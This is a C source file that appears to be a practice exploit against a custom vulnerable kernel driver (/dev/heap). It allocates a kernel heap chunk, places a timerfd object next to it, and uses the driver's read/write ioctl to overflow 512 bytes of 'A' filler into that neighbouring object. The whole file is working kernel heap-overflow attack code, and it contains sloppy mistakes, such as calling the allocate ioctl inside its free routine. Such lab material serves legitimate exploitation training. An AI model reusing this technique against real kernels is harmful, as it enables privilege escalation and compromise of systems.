#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/timerfd.h>
#include <time.h>

#include "../heap.h"

#define MAX_ADDRESSES 1024

int fd;
unsigned long allocated_addresses[MAX_ADDRESSES] = {0};
unsigned int current_max = 0;

void free_all_addresses();

void driver_free(unsigned long address){
	int ret;

	ret = ioctl(fd, IOCTL_KMALLOC, address);
	if(ret < -1){
		printf("[-] Failed to allocate kernel memory");
		exit(-1);
	}else{
		for(int i = 0; i < current_max; i++){
			if(allocated_addresses[i] == address){
				allocated_addresses[i] = 0;
			}
		}
	}
}

void driver_alloc(struct iomalloc *iom){
	int ret;

	ret = ioctl(fd, IOCTL_KMALLOC, iom);
	if(ret < -1){
		printf("[-] Failed to allocate kernel memory");
		free_all_addresses();
		exit(-1);
	}else{
		allocated_addresses[current_max++] = (unsigned long)iom->addr;
	}
}

void driver_read_write(void* from, void* to, size_t size){
	int ret;

	struct iorw *rw = (struct iorw*)malloc(sizeof(struct iorw));
	if(rw == NULL){
		printf("[-] Failed to allocate iorw struct\n");
		exit(-1);
	}

	rw->size = size;
	rw->from = from;
	rw->to = to;

	ret = ioctl(fd, IOCTL_RW_HEAP, rw);
	if(ret < -1){
		printf("[-] Failed to read/write from/to kernel heap\n");
		perror("Kernel read");
		exit(-1);
	}

	free(rw);
}

void create_timer_instance(){
	int tfd;
	struct itimerspec i;

	i.it_interval.tv_sec = 0;
	i.it_interval.tv_nsec = 0;
	i.it_value.tv_sec = 10;
	i.it_value.tv_nsec = 0;

	tfd = timerfd_create(CLOCK_REALTIME, 0);
	timerfd_settime(tfd, 0, &i, 0);
}

int main(){
	int ret;
	struct iomalloc *iom;
	unsigned long payload[512] = {0};

	for(int i=0; i < 512; i++){
		payload[i] = 0x4141414141414141;
	}

	printf("[+] Opening device file...\n");

	fd = open("/dev/heap", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		perror("Opening file");
		exit(-1);
	}

	iom = (struct iomalloc*)malloc(sizeof(struct iomalloc));
	if(iom == NULL){
		printf("[-] Failed to allocate payload struct\n");
		close(fd);
		exit(-1);
	}

	iom->size = 256;
	iom->addr = NULL;

	printf("[+] Allocating address...\n");
	driver_alloc(iom);
	printf("[+] Creating timerfd struct...\n");
	create_timer_instance();
	printf("[+] Overloading timerfd...\n");
	driver_read_write(iom->addr, payload, 512);

	free_all_addresses();

	close(fd);
	free(iom);
}

void free_all_addresses(){
	for(int i = 0; i < current_max; i++){
		ioctl(fd, IOCTL_KFREE, allocated_addresses[i]);
	}
}